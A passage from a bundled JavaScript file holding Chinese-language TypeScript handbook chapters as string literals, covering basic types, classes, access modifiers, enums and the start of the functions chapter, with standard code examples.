boolean\n```\n\n在对现有代码进行改写的时候，`any`类型是十分有用的，它允许你在编译时可选择地包含或移除类型检查。 你可能认为`Object`有相似的作用，就像它在其它语言中那样。 但是`Object`类型的变量只是允许你给它赋任意值 - 但是却不能够在它上面调用任意的方法，即便它真的有这些方法：\n\n```typescript\nlet notSure: any = 4;\nnotSure.ifItExists(); // okay, ifItExists might exist at runtime\nnotSure.toFixed(); // okay, toFixed exists (but the compiler doesn\'t check)\n\nlet prettySure: Object = 4;\nprettySure.toFixed(); // Error: Property \'toFixed\' doesn\'t exist on type \'Object\'.\n```\n\n> 注意：应避免使用`Object`，而是使用非原始`object`类型，正如[Do\'s and Don\'ts](../doc/handbook/declaration%20files/Do\'s%20and%20Don\'ts.md)里所讲的那样。\n\n当你只知道一部分数据的类型时，`any`类型也是有用的。 比如，你有一个数组，它包含了不同的类型的数据：\n\n```typescript\nlet list: any[] = [1, true, "free"];\n\nlist[1] = 100;\n```\n\n## Void\n\n某种程度上来说，`void`类型像是与`any`类型相反，它表示没有任何类型。 当一个函数没有返回值时，你通常会见到其返回值类型是`void`：\n\n```typescript\nfunction warnUser(): void {\n    console.log("This is my warning message");\n}\n```\n\n声明一个`void`类型的变量没有什么大用，因为你只能为它赋予`null`（只在`--strictNullChecks`未指定时）和`undefined`：\n\n```typescript\nlet unusable: void = undefined;\n```\n\n## Null 和 Undefined\n\nTypeScript里，`undefined`和`null`两者各自有自己的类型分别叫做`undefined`和`null`。 和`void`相似，它们的本身的类型用处不是很大：\n\n```typescript\n// Not much else we can assign to these variables!\nlet u: undefined = undefined;\nlet n: null = null;\n```\n\n默认情况下`null`和`undefined`是所有类型的子类型。 就是说你可以把`null`和`undefined`赋值给`number`类型的变量。\n\n然而，当你指定了`--strictNullChecks`标记，`null`和`undefined`只能赋值给`any`和它们各自的类型（有一个例外是`undefined`还可以赋值给`void`类型）。 这能避免_很多_常见的问题。 也许在某处你想传入一个`string`或`null`或`undefined`，你可以使用联合类型`string | null | undefined`。\n\n联合类型是高级主题，我们会在以后的章节里讨论它。\n\n> 注意：我们鼓励尽可能地使用`--strictNullChecks`，但在本手册里我们假设这个标记是关闭的。\n\n## Never\n\n`never`类型表示的是那些永不存在的值的类型。 例如，`never`类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型； 变量也可能是`never`类型，当它们被永不为真的类型保护所约束时。\n\n`never`类型是任何类型的子类型，也可以赋值给任何类型；然而，_没有_类型是`never`的子类型或可以赋值给`never`类型（除了`never`本身之外）。 即使`any`也不可以赋值给`never`。\n\n下面是一些返回`never`类型的函数：\n\n```typescript\n// 返回never的函数必须存在无法达到的终点\nfunction error(message: string): never {\n    throw new Error(message);\n}\n\n// 推断的返回值类型为never\nfunction fail() {\n    return error("Something failed");\n}\n\n// 返回never的函数必须存在无法达到的终点\nfunction infiniteLoop(): never {\n    while (true) {\n    }\n}\n```\n\n## Object\n\n`object`表示非原始类型，也就是除`number`，`string`，`boolean`，`bigint`，`symbol`，`null`或`undefined`之外的类型。\n\n使用`object`类型，就可以更好的表示像`Object.create`这样的API。例如：\n\n```typescript\ndeclare function create(o: object | null): void;\n\ncreate({ prop: 0 }); // OK\ncreate(null); // OK\n\ncreate(42); // Error\ncreate("string"); // Error\ncreate(false); // Error\ncreate(undefined); // Error\n```\n\n## 类型断言\n\n有时候你会遇到这样的情况，你会比TypeScript更了解某个值的详细信息。 通常这会发生在你清楚地知道一个实体具有比它现有类型更确切的类型。\n\n通过_类型断言_这种方式可以告诉编译器，“相信我，我知道自己在干什么”。 类型断言好比其它语言里的类型转换，但是不进行特殊的数据检查和解构。 它没有运行时的影响，只是在编译阶段起作用。 TypeScript会假设你，程序员，已经进行了必须的检查。\n\n类型断言有两种形式。 其一是“尖括号”语法：\n\n```typescript\nlet someValue: any = "this is a string";\n\nlet strLength: number = (<string>someValue).length;\n```\n\n另一个为`as`语法：\n\n```typescript\nlet someValue: any = "this is a string";\n\nlet strLength: number = (someValue as string).length;\n```\n\n两种形式是等价的。 至于使用哪个大多数情况下是凭个人喜好；然而，当你在TypeScript里使用JSX时，只有`as`语法断言是被允许的。\n\n## 关于`let`\n\n你可能已经注意到了，我们使用`let`关键字来代替大家所熟悉的JavaScript关键字`var`。 `let`是ES2015引入的关键字，它比`var`更加安全，因此被看做是声明变量的标准方式。 我们会在以后详细介绍它，很多常见的问题都可以通过使用`let`来解决，所以尽可能地使用`let`来代替`var`吧。\n\n## 关于 Number, String, Boolean, Symbol 和 Object\n\n我们很容易会认为 `Number`、 `String`、 `Boolean`、`Symbol` 以及 `Object` 这些类型和我们以上推荐的小写版本的类型是一样的。但这些类型不属于语言的基本类型，并且几乎在任何时候都不应该被用作一个类型：\n\n```typescript\n// @errors: 2339\nfunction reverse(s: String): String {\n  return s.split("").reverse().join("");\n}\n\nreverse("hello world");\n```\n\n相对地，我们应该使用 `number`、`string`、`boolean`、`object` 和 `symbol`\n\n```typescript\nfunction reverse(s: string): string {\n  return s.split("").reverse().join("");\n}\n\nreverse("hello world");\n```\n\n',sl='# 类\n\n## 介绍\n\n传统的JavaScript程序使用函数和基于原型的继承来创建可重用的组件，但对于熟悉使用面向对象方式的程序员来讲就有些棘手，因为他们用的是基于类的继承并且对象是由类构建出来的。 从ECMAScript 2015，也就是ECMAScript 6开始，JavaScript程序员将能够使用基于类的面向对象的方式。 使用TypeScript，我们允许开发者现在就使用这些特性，并且编译后的JavaScript可以在所有主流浏览器和平台上运行，而不需要等到下个JavaScript版本。\n\n## 类\n\n下面看一个使用类的例子：\n\n```typescript\nclass Greeter {\n    greeting: string;\n    constructor(message: string) {\n        this.greeting = message;\n    }\n    greet() {\n        return "Hello, " + this.greeting;\n    }\n}\n\nlet greeter = new Greeter("world");\n```\n\n如果你使用过C\\#或Java，你会对这种语法非常熟悉。 我们声明一个`Greeter`类。这个类有3个成员：一个叫做`greeting`的属性，一个构造函数和一个`greet`方法。\n\n你会注意到，我们在引用任何一个类成员的时候都用了`this`。 它表示我们访问的是类的成员。\n\n最后一行，我们使用`new`构造了`Greeter`类的一个实例。 它会调用之前定义的构造函数，创建一个`Greeter`类型的新对象，并执行构造函数初始化它。\n\n## 继承\n\n在TypeScript里，我们可以使用常用的面向对象模式。 基于类的程序设计中一种最基本的模式是允许使用继承来扩展现有的类。\n\n看下面的例子：\n\n```typescript\nclass Animal {\n    move(distanceInMeters: number = 0) {\n        console.log(`Animal moved ${distanceInMeters}m.`);\n    }\n}\n\nclass Dog extends Animal {\n    bark() {\n        console.log(\'Woof! Woof!\');\n    }\n}\n\nconst dog = new Dog();\ndog.bark();\ndog.move(10);\ndog.bark();\n```\n\n这个例子展示了最基本的继承：类从基类中继承了属性和方法。 这里，`Dog`是一个_派生类_，它派生自`Animal`_基类_，通过`extends`关键字。 派生类通常被称作_子类_，基类通常被称作_超类_。\n\n因为`Dog`继承了`Animal`的功能，因此我们可以创建一个`Dog`的实例，它能够`bark()`和`move()`。\n\n下面我们来看个更加复杂的例子。\n\n```typescript\nclass Animal {\n    name: string;\n    constructor(theName: string) { this.name = theName; }\n    move(distanceInMeters: number = 0) {\n        console.log(`${this.name} moved ${distanceInMeters}m.`);\n    }\n}\n\nclass Snake extends Animal {\n    constructor(name: string) { super(name); }\n    move(distanceInMeters = 5) {\n        console.log("Slithering...");\n        super.move(distanceInMeters);\n    }\n}\n\nclass Horse extends Animal {\n    constructor(name: string) { super(name); }\n    move(distanceInMeters = 45) {\n        console.log("Galloping...");\n        super.move(distanceInMeters);\n    }\n}\n\nlet sam = new Snake("Sammy the Python");\nlet tom: Animal = new Horse("Tommy the Palomino");\n\nsam.move();\ntom.move(34);\n```\n\n这个例子展示了一些上面没有提到的特性。 这一次，我们使用`extends`关键字创建了`Animal`的两个子类：`Horse`和`Snake`。\n\n与前一个例子的不同点是，派生类包含了一个构造函数，它_必须_调用`super()`，它会执行基类的构造函数。 而且，在构造函数里访问`this`的属性之前，我们_一定_要调用`super()`。 这个是TypeScript强制执行的一条重要规则。\n\n这个例子演示了如何在子类里可以重写父类的方法。 `Snake`类和`Horse`类都创建了`move`方法，它们重写了从`Animal`继承来的`move`方法，使得`move`方法根据不同的类而具有不同的功能。 注意，即使`tom`被声明为`Animal`类型，但因为它的值是`Horse`，调用`tom.move(34)`时，它会调用`Horse`里重写的方法：\n\n```text\nSlithering...\nSammy the Python moved 5m.\nGalloping...\nTommy the Palomino moved 34m.\n```\n\n## 公共，私有与受保护的修饰符\n\n### 默认为`public`\n\n在上面的例子里，我们可以自由的访问程序里定义的成员。 如果你对其它语言中的类比较了解，就会注意到我们在之前的代码里并没有使用`public`来做修饰；例如，C\\#要求必须明确地使用`public`指定成员是可见的。 在TypeScript里，成员都默认为`public`。\n\n你也可以明确的将一个成员标记成`public`。 我们可以用下面的方式来重写上面的`Animal`类：\n\n```typescript\nclass Animal {\n    public name: string;\n    public constructor(theName: string) { this.name = theName; }\n    public move(distanceInMeters: number) {\n        console.log(`${this.name} moved ${distanceInMeters}m.`);\n    }\n}\n```\n\n### 理解`private`\n\n当成员被标记成`private`时，它就不能在声明它的类的外部访问。比如：\n\n```typescript\nclass Animal {\n    private name: string;\n    constructor(theName: string) { this.name = theName; }\n}\n\nnew Animal("Cat").name; // 错误: \'name\' 是私有的.\n```\n\nTypeScript使用的是结构性类型系统。 当我们比较两种不同的类型时，并不在乎它们从何处而来，如果所有成员的类型都是兼容的，我们就认为它们的类型是兼容的。\n\n然而，当我们比较带有`private`或`protected`成员的类型的时候，情况就不同了。 如果其中一个类型里包含一个`private`成员，那么只有当另外一个类型中也存在这样一个`private`成员， 并且它们都是来自同一处声明时，我们才认为这两个类型是兼容的。 对于`protected`成员也使用这个规则。\n\n下面来看一个例子，更好地说明了这一点：\n\n```typescript\nclass Animal {\n    private name: string;\n    constructor(theName: string) { this.name = theName; }\n}\n\nclass Rhino extends Animal {\n    constructor() { super("Rhino"); }\n}\n\nclass Employee {\n    private name: string;\n    constructor(theName: string) { this.name = theName; }\n}\n\nlet animal = new Animal("Goat");\nlet rhino = new Rhino();\nlet employee = new Employee("Bob");\n\nanimal = rhino;\nanimal = employee; // 错误: Animal 与 Employee 不兼容.\n```\n\n这个例子中有`Animal`和`Rhino`两个类，`Rhino`是`Animal`类的子类。 还有一个`Employee`类，其类型看上去与`Animal`是相同的。 我们创建了几个这些类的实例，并相互赋值来看看会发生什么。 因为`Animal`和`Rhino`共享了来自`Animal`里的私有成员定义`private name: string`，因此它们是兼容的。 然而`Employee`却不是这样。当把`Employee`赋值给`Animal`的时候，得到一个错误，说它们的类型不兼容。 尽管`Employee`里也有一个私有成员`name`，但它明显不是`Animal`里面定义的那个。\n\n### 理解`protected`\n\n`protected`修饰符与`private`修饰符的行为很相似，但有一点不同，`protected`成员在派生类中仍然可以访问。例如：\n\n```typescript\nclass Person {\n    protected name: string;\n    constructor(name: string) { this.name = name; }\n}\n\nclass Employee extends Person {\n    private department: string;\n\n    constructor(name: string, department: string) {\n        super(name)\n        this.department = department;\n    }\n\n    public getElevatorPitch() {\n        return `Hello, my name is ${this.name} and I work in ${this.department}.`;\n    }\n}\n\nlet howard = new Employee("Howard", "Sales");\nconsole.log(howard.getElevatorPitch());\nconsole.log(howard.name); // 错误\n```\n\n注意，我们不能在`Person`类外使用`name`，但是我们仍然可以通过`Employee`类的实例方法访问，因为`Employee`是由`Person`派生而来的。\n\n构造函数也可以被标记成`protected`。 这意味着这个类不能在包含它的类外被实例化，但是能被继承。比如，\n\n```typescript\nclass Person {\n    protected name: string;\n    protected constructor(theName: string) { this.name = theName; }\n}\n\n// Employee 能够继承 Person\nclass Employee extends Person {\n    private department: string;\n\n    constructor(name: string, department: string) {\n        super(name);\n        this.department = department;\n    }\n\n    public getElevatorPitch() {\n        return `Hello, my name is ${this.name} and I work in ${this.department}.`;\n    }\n}\n\nlet howard = new Employee("Howard", "Sales");\nlet john = new Person("John"); // 错误: \'Person\' 的构造函数是被保护的.\n```\n\n## readonly修饰符\n\n你可以使用`readonly`关键字将属性设置为只读的。 只读属性必须在声明时或构造函数里被初始化。\n\n```typescript\nclass Octopus {\n    readonly name: string;\n    readonly numberOfLegs: number = 8;\n    constructor (theName: string) {\n        this.name = theName;\n    }\n}\nlet dad = new Octopus("Man with the 8 strong legs");\ndad.name = "Man with the 3-piece suit"; // 错误! name 是只读的.\n```\n\n### 参数属性\n\n在上面的例子中，我们不得不在在`Person`类里定义一个只读成员`name`和一个构造函数参数`theName`。这样做是为了在`Octopus`构造函数被执行后，就可以访问`theName`的值。 这种情况经常会遇到。_参数属性_可以方便地让我们在一个地方定义并初始化一个成员。 下面的例子是对之前`Animal`类的修改版，使用了参数属性：\n\n```typescript\nclass Animal {\n    constructor(private name: string) { }\n    move(distanceInMeters: number) {\n        console.log(`${this.name} moved ${distanceInMeters}m.`);\n    }\n}\n```\n\n注意看我们是如何舍弃了`theName`，仅在构造函数里使用`private name: string`参数来创建和初始化`name`成员。 我们把声明和赋值合并至一处。\n\n参数属性通过给构造函数参数添加一个访问限定符来声明。 使用`private`限定一个参数属性会声明并初始化一个私有成员；对于`public`和`protected`来说也是一样。\n\n## 存取器\n\nTypeScript支持通过getters/setters来截取对对象成员的访问。 它能帮助你有效的控制对对象成员的访问。\n\n下面来看如何把一个简单的类改写成使用`get`和`set`。 首先，我们从一个没有使用存取器的例子开始。\n\n```typescript\nclass Employee {\n    fullName: string;\n}\n\nlet employee = new Employee();\nemployee.fullName = "Bob Smith";\nif (employee.fullName) {\n    console.log(employee.fullName);\n}\n```\n\n允许随意设置`fullName`虽然方便，但是我们仍想在设置`fullName`强制执行某些约束。\n\n在这个版本里，我们添加一个`setter`来检查`newName`的长度，以确保它满足数据库字段的最大长度限制。若它不满足，那么我们就抛一个错误来告诉客户端出错了。\n\n为保留原有的功能，我们同时添加一个`getter`用来读取`fullName`。\n\n```typescript\nconst fullNameMaxLength = 10;\n\nclass Employee {\n    private _fullName: string;\n\n    get fullName(): string {\n        return this._fullName;\n    }\n\n    set fullName(newName: string) {\n        if (newName && newName.length > fullNameMaxLength) {\n            throw new Error("fullName has a max length of " + fullNameMaxLength);\n        }\n\n        this._fullName = newName;\n    }\n}\n\nlet employee = new Employee();\nemployee.fullName = "Bob Smith";\nif (employee.fullName) {\n    alert(employee.fullName);\n}\n```\n\n为证明我们写的存取器现在能检查长度，我们可以给名字赋一个长度大于`10`字符的值，并验证是否得到一个错误。\n\n对于存取器有下面几点需要注意的：\n\n首先，存取器要求你将编译器设置为输出ECMAScript 5或更高。 不支持降级到ECMAScript 3。 其次，只带有`get`不带有`set`的存取器自动被推断为`readonly`。 这在从代码生成`.d.ts`文件时是有帮助的，因为利用这个属性的用户会看到不允许够改变它的值。\n\n## 静态属性\n\n到目前为止，我们只讨论了类的实例成员，那些仅当类被实例化的时候才会被初始化的属性。 我们也可以创建类的静态成员，这些属性存在于类本身上面而不是类的实例上。 在这个例子里，我们使用`static`定义`origin`，因为它是所有网格都会用到的属性。 每个实例想要访问这个属性的时候，都要在`origin`前面加上类名。 如同在实例属性上使用`this.`前缀来访问属性一样，这里我们使用`Grid.`来访问静态属性。\n\n```typescript\nclass Grid {\n    static origin = {x: 0, y: 0};\n    calculateDistanceFromOrigin(point: {x: number; y: number;}) {\n        let xDist = (point.x - Grid.origin.x);\n        let yDist = (point.y - Grid.origin.y);\n        return Math.sqrt(xDist * xDist + yDist * yDist) / this.scale;\n    }\n    constructor (public scale: number) { }\n}\n\nlet grid1 = new Grid(1.0);  // 1x scale\nlet grid2 = new Grid(5.0);  // 5x scale\n\nconsole.log(grid1.calculateDistanceFromOrigin({x: 10, y: 10}));\nconsole.log(grid2.calculateDistanceFromOrigin({x: 10, y: 10}));\n```\n\n## 抽象类\n\n抽象类做为其它派生类的基类使用。 它们一般不会直接被实例化。 不同于接口，抽象类可以包含成员的实现细节（抽象类中除抽象函数之外，其他函数可以包含具体实现）。 `abstract`关键字是用于定义抽象类和在抽象类内部定义抽象方法。\n\n```typescript\nabstract class Animal {\n    abstract makeSound(): void;\n    move(): void {\n        console.log("roaming the earth...");\n    }\n}\n```\n\n抽象类中的抽象方法不包含具体实现并且必须在派生类中实现。 抽象方法的语法与接口方法相似。 两者都是定义方法签名但不包含方法体。 然而，抽象方法必须包含`abstract`关键字并且可以包含访问修饰符。\n\n```typescript\nabstract class Department {\n\n    constructor(public name: string) {\n    }\n\n    printName(): void {\n        console.log(\'Department name: \' + this.name);\n    }\n\n    abstract printMeeting(): void; // 必须在派生类中实现\n}\n\nclass AccountingDepartment extends Department {\n\n    constructor() {\n        super(\'Accounting and Auditing\'); // 在派生类的构造函数中必须调用 super()\n    }\n\n    printMeeting(): void {\n        console.log(\'The Accounting Department meets each Monday at 10am.\');\n    }\n\n    generateReports(): void {\n        console.log(\'Generating accounting reports...\');\n    }\n}\n\nlet department: Department; // 允许创建一个对抽象类型的引用\ndepartment = new Department(); // 错误: 不能创建一个抽象类的实例\ndepartment = new AccountingDepartment(); // 允许对一个抽象子类进行实例化和赋值\ndepartment.printName();\ndepartment.printMeeting();\ndepartment.generateReports(); // 错误: 方法在声明的抽象类中不存在\n```\n\n## 高级技巧\n\n### 构造函数\n\n当你在TypeScript里声明了一个类的时候，实际上同时声明了很多东西。 首先就是类的_实例_的类型。\n\n```typescript\nclass Greeter {\n    greeting: string;\n    constructor(message: string) {\n        this.greeting = message;\n    }\n    greet() {\n        return "Hello, " + this.greeting;\n    }\n}\n\nlet greeter: Greeter;\ngreeter = new Greeter("world");\nconsole.log(greeter.greet());\n```\n\n这里，我们写了`let greeter: Greeter`，意思是`Greeter`类的实例的类型是`Greeter`。 这对于用过其它面向对象语言的程序员来讲已经是老习惯了。\n\n我们也创建了一个叫做_构造函数_的值。 这个函数会在我们使用`new`创建类实例的时候被调用。 下面我们来看看，上面的代码被编译成JavaScript后是什么样子的：\n\n```typescript\nlet Greeter = (function () {\n    function Greeter(message) {\n        this.greeting = message;\n    }\n    Greeter.prototype.greet = function () {\n        return "Hello, " + this.greeting;\n    };\n    return Greeter;\n})();\n\nlet greeter;\ngreeter = new Greeter("world");\nconsole.log(greeter.greet());\n```\n\n上面的代码里，`let Greeter`将被赋值为构造函数。 当我们调用`new`并执行了这个函数后，便会得到一个类的实例。 这个构造函数也包含了类的所有静态属性。 换个角度说，我们可以认为类具有_实例部分_与_静态部分_这两个部分。\n\n让我们稍微改写一下这个例子，看看它们之间的区别：\n\n```typescript\nclass Greeter {\n    static standardGreeting = "Hello, there";\n    greeting: string;\n    greet() {\n        if (this.greeting) {\n            return "Hello, " + this.greeting;\n        }\n        else {\n            return Greeter.standardGreeting;\n        }\n    }\n}\n\nlet greeter1: Greeter;\ngreeter1 = new Greeter();\nconsole.log(greeter1.greet());\n\nlet greeterMaker: typeof Greeter = Greeter;\ngreeterMaker.standardGreeting = "Hey there!";\n\nlet greeter2: Greeter = new greeterMaker();\nconsole.log(greeter2.greet());\n```\n\n这个例子里，`greeter1`与之前看到的一样。 我们实例化`Greeter`类，并使用这个对象。 与我们之前看到的一样。\n\n再之后，我们直接使用类。 我们创建了一个叫做`greeterMaker`的变量。 这个变量保存了这个类或者说保存了类构造函数。 然后我们使用`typeof Greeter`，意思是取Greeter类的类型，而不是实例的类型。 或者更确切的说，"告诉我`Greeter`标识符的类型"，也就是构造函数的类型。 这个类型包含了类的所有静态成员和构造函数。 之后，就和前面一样，我们在`greeterMaker`上使用`new`，创建`Greeter`的实例。\n\n### 把类当做接口使用\n\n如上一节里所讲的，类定义会创建两个东西：类的实例类型和一个构造函数。 因为类可以创建出类型，所以你能够在允许使用接口的地方使用类。\n\n```typescript\nclass Point {\n    x: number;\n    y: number;\n}\n\ninterface Point3d extends Point {\n    z: number;\n}\n\nlet point3d: Point3d = {x: 1, y: 2, z: 3};\n```\n\n',ol="# 枚举\n\n## 枚举\n\n使用枚举我们可以定义一些带名字的常量。 使用枚举可以清晰地表达意图或创建一组有区别的用例。 TypeScript支持数字的和基于字符串的枚举。\n\n### 数字枚举\n\n首先我们看看数字枚举，如果你使用过其它编程语言应该会很熟悉。\n\n```typescript\nenum Direction {\n    Up = 1,\n    Down,\n    Left,\n    Right\n}\n```\n\n如上，我们定义了一个数字枚举，`Up`使用初始化为`1`。 其余的成员会从`1`开始自动增长。 换句话说，`Direction.Up`的值为`1`，`Down`为`2`，`Left`为`3`，`Right`为`4`。\n\n我们还可以完全不使用初始化器：\n\n```typescript\nenum Direction {\n    Up,\n    Down,\n    Left,\n    Right,\n}\n```\n\n现在，`Up`的值为`0`，`Down`的值为`1`等等。 当我们不在乎成员的值的时候，这种自增长的行为是很有用处的，但是要注意每个枚举成员的值都是不同的。\n\n使用枚举很简单：通过枚举的属性来访问枚举成员，和枚举的名字来访问枚举类型：\n\n```typescript\nenum Response {\n    No = 0,\n    Yes = 1,\n}\n\nfunction respond(recipient: string, message: Response): void {\n    // ...\n}\n\nrespond(\"Princess Caroline\", Response.Yes)\n```\n\n数字枚举可以被混入到[计算过的和常量成员（如下所示）](enums.md#computed-and-constant-members)。 简短地说，没有初始化器的成员要么在首位，要么必须在用数值常量或其他常量枚举成员初始化的数值枚举之后。 换句话说，下面的情况是不被允许的：\n\n```typescript\nenum E {\n    A = getSomeValue(),\n    B, // Error! Enum member must have initializer.\n}\n```\n\n### 字符串枚举\n\n字符串枚举的概念很简单，但是有细微的[运行时的差别](enums.md#enums-at-runtime)。 在一个字符串枚举里，每个成员都必须用字符串字面量，或另外一个字符串枚举成员进行初始化。\n\n```typescript\nenum Direction {\n    Up = \"UP\",\n    Down = \"DOWN\",\n    Left = \"LEFT\",\n    Right = \"RIGHT\",\n}\n```\n\n由于字符串枚举没有自增长的行为，字符串枚举可以很好的序列化。 换句话说，如果你正在调试并且必须要读一个数字枚举的运行时的值，这个值通常是很难读的 - 它并不能表达有用的信息（尽管[反向映射](enums.md#enums-at-runtime)会有所帮助），字符串枚举允许你提供一个运行时有意义的并且可读的值，独立于枚举成员的名字。\n\n### 异构枚举（Heterogeneous enums）\n\n从技术的角度来说，枚举可以混合字符串和数字成员，但是似乎你并不会这么做：\n\n```typescript\nenum BooleanLikeHeterogeneousEnum {\n    No = 0,\n    Yes = \"YES\",\n}\n```\n\n除非你真的想要利用JavaScript运行时的行为，否则我们不建议这样做。\n\n### 计算的和常量成员\n\n每个枚举成员都带有一个值，它可以是_常量_或_计算出来的_。 当满足如下条件时，枚举成员被当作是常量：\n\n* 它是枚举的第一个成员且没有初始化器，这种情况下它被赋予值`0`：\n\n  ```typescript\n  // E.X is constant:\n  enum E { X }\n  ```\n\n* 它不带有初始化器且它之前的枚举成员是一个_数字_常量。 这种情况下，当前枚举成员的值为它上一个枚举成员的值加1。\n\n  ```typescript\n  // All enum members in 'E1' and 'E2' are constant.\n\n  enum E1 { X, Y, Z }\n\n  enum E2 {\n      A = 1, B, C\n  }\n  ```\n\n* 枚举成员使用_常量枚举表达式_初始化。 常量枚举表达式是TypeScript表达式的子集，它可以在编译阶段求值。 当一个表达式满足下面条件之一时，它就是一个常量枚举表达式：\n\n  1. 一个枚举表达式字面量（主要是字符串字面量或数字字面量）\n  2. 一个对之前定义的常量枚举成员的引用（可以是在不同的枚举类型中定义的）\n  3. 带括号的常量枚举表达式\n  4. 一元运算符`+`, `-`, `~`其中之一应用在了常量枚举表达式\n  5. 常量枚举表达式做为二元运算符`+`, `-`, `*`, `/`, `%`, `<<`, `>>`, `>>>`, `&`, `|`, `^`的操作对象。\n\n  若常量枚举表达式求值后为`NaN`或`Infinity`，则会在编译阶段报错。\n\n所有其它情况的枚举成员被当作是需要计算得出的值。\n\n```typescript\nenum FileAccess {\n    // constant members\n    None,\n    Read    = 1 << 1,\n    Write   = 1 << 2,\n    ReadWrite  = Read | Write,\n    // computed member\n    G = \"123\".length\n}\n```\n\n### 联合枚举与枚举成员的类型\n\n存在一种特殊的非计算的常量枚举成员的子集：字面量枚举成员。 字面量枚举成员是指不带有初始值的常量枚举成员，或者是值被初始化为\n\n* 任何字符串字面量（例如：`\"foo\"`，`\"bar\"`，`\"baz\"`）\n* 任何数字字面量（例如：`1`, `100`）\n* 应用了一元`-`符号的数字字面量（例如：`-1`, `-100`）\n\n当所有枚举成员都拥有字面量枚举值时，它就带有了一种特殊的语义。\n\n首先，枚举成员成为了类型！ 例如，我们可以说某些成员_只能_是枚举成员的值：\n\n```typescript\nenum ShapeKind {\n    Circle,\n    Square,\n}\n\ninterface Circle {\n    kind: ShapeKind.Circle;\n    radius: number;\n}\n\ninterface Square {\n    kind: ShapeKind.Square;\n    sideLength: number;\n}\n\nlet c: Circle = {\n    kind: ShapeKind.Square, // Error! Type 'ShapeKind.Square' is not assignable to type 'ShapeKind.Circle'.\n    radius: 100,\n}\n```\n\n另一个变化是枚举类型本身变成了每个枚举成员的_联合_。 虽然我们还没有讨论[联合类型](advanced-types.md#union-types)，但你只要知道通过联合枚举，类型系统能够利用这样一个事实，它可以知道枚举里的值的集合。 因此，TypeScript能够捕获在比较值的时候犯的愚蠢的错误。 例如：\n\n```typescript\nenum E {\n    Foo,\n    Bar,\n}\n\nfunction f(x: E) {\n    if (x !== E.Foo || x !== E.Bar) {\n        //             ~~~~~~~~~~~\n        // Error! This condition will always return 'true' since the types 'E.Foo' and 'E.Bar' have no overlap.\n    }\n}\n```\n\n这个例子里，我们先检查`x`是否不是`E.Foo`。 如果通过了这个检查，然后`||`会发生短路效果，`if`语句体里的内容会被执行。 然而，这个检查没有通过，那么`x`则_只能_为`E.Foo`，因此没理由再去检查它是否为`E.Bar`。\n\n### 运行时的枚举\n\n枚举是在运行时真正存在的对象。 例如下面的枚举：\n\n```typescript\nenum E {\n    X, Y, Z\n}\n```\n\n可以传递给函数\n\n```typescript\nfunction f(obj: { X: number }) {\n    return obj.X;\n}\n\n// 没问题，因为 'E'包含一个数值型属性'X'。\nf(E);\n```\n\n### 编译时的枚举\n\n尽管一个枚举是在运行时真正存在的对象，但`keyof`关键字的行为与其作用在对象上时有所不同。应该使用`keyof typeof`来获取一个表示枚举里所有字符串`key`的类型。\n\n```typescript\nenum LogLevel {\n    ERROR, WARN, INFO, DEBUG\n}\n\n/**\n * 等同于：\n * type LogLevelStrings = 'ERROR' | 'WARN' | 'INFO' | 'DEBUG';\n */\ntype LogLevelStrings = keyof typeof LogLevel;\n\nfunction printImportant(key: LogLevelStrings, message: string) {\n    const num = LogLevel[key];\n    if (num <= LogLevel.WARN) {\n       console.log('Log level key is: ', key);\n       console.log('Log level value is: ', num);\n       console.log('Log level message is: ', message);\n    }\n}\nprintImportant('ERROR', 'This is a message');\n```\n\n#### 反向映射\n\n除了创建一个以属性名做为对象成员的对象之外，数字枚举成员还具有了_反向映射_，从枚举值到枚举名字。 例如，在下面的例子中：\n\n```typescript\nenum Enum {\n    A\n}\nlet a = Enum.A;\nlet nameOfA = Enum[a]; // \"A\"\n```\n\nTypeScript可能会将这段代码编译为下面的JavaScript：\n\n```javascript\nvar Enum;\n(function (Enum) {\n    Enum[Enum[\"A\"] = 0] = \"A\";\n})(Enum || (Enum = {}));\nvar a = Enum.A;\nvar nameOfA = Enum[a]; // \"A\"\n```\n\n生成的代码中，枚举类型被编译成一个对象，它包含了正向映射（`name` -&gt; `value`）和反向映射（`value` -&gt; `name`）。 引用枚举成员总会生成为对属性访问并且永远也不会内联代码。\n\n要注意的是_不会_为字符串枚举成员生成反向映射。\n\n#### `const`枚举\n\n大多数情况下，枚举是十分有效的方案。 然而在某些情况下需求很严格。 为了避免在额外生成的代码上的开销和额外的非直接的对枚举成员的访问，我们可以使用`const`枚举。 常量枚举通过在枚举上使用`const`修饰符来定义。\n\n```typescript\nconst enum Enum {\n    A = 1,\n    B = A * 2\n}\n```\n\n常量枚举只能使用常量枚举表达式，并且不同于常规的枚举，它们在编译阶段会被删除。 常量枚举成员在使用的地方会被内联进来。 之所以可以这么做是因为，常量枚举不允许包含计算成员。\n\n```typescript\nconst enum Directions {\n    Up,\n    Down,\n    Left,\n    Right\n}\n\nlet directions = [Directions.Up, Directions.Down, Directions.Left, Directions.Right]\n```\n\n生成后的代码为：\n\n```javascript\nvar directions = [0 /* Up */, 1 /* Down */, 2 /* Left */, 3 /* Right */];\n```\n\n## 外部枚举\n\n外部枚举用来描述已经存在的枚举类型的形状。\n\n```typescript\ndeclare enum Enum {\n    A = 1,\n    B,\n    C = 2\n}\n```\n\n外部枚举和非外部枚举之间有一个重要的区别，在正常的枚举里，没有初始化方法的成员被当成常量成员。 对于非常量的外部枚举而言，没有初始化方法时被当做需要经过计算的。\n\n",ll='# 函数\n\n## 介绍\n\n函数是JavaScript应用程序的基础。 它帮助你实现抽象层，模拟类，信息隐藏和模块。 在TypeScript里，虽然已经支持类，命名空间和模块，但函数仍然是主要的定义_行为_的地方。 TypeScript为JavaScript函数添加了额外的功能，让我们可以更容易地使用。\n\n## 函数\n\n和JavaScript一样，TypeScript函数可以创建有名字的函数和匿名函数。 你可以随意选择适合应用程序的方式，不论是定义一系列API函数还是只使用一次的函数。\n\n通过下面的例子可以迅速回想起这两种JavaScript中的函数：\n\n```typescript\n// Named function\nfunction add(x, y) {\n    return x + y;\n}\n\n// Anonymous function\nlet myAdd = function(x, y) { return x + y; };\n```\n\n在JavaScript里，函数可以使用函数体外部的变量。 当函数这么做时，我们说它‘捕获’了这些变量。 至于为什么可以这样做以及其中的利弊超出了本文的范围，但是深刻理解这个机制对学习JavaScript和TypeScript会很有帮助。\n\n```typescript\nlet z = 100;\n\nfunction addToZ(x, y) {\n    return x + y + z;\n}\n```\n\n## 函数类型\n\n### 为函数定义类型\n\n让我们为上面那个函数添加类型：\n\n```typescript\nfunction add(x: number, y: number): number {\n    return x + y;\n}\n\nlet myAdd = 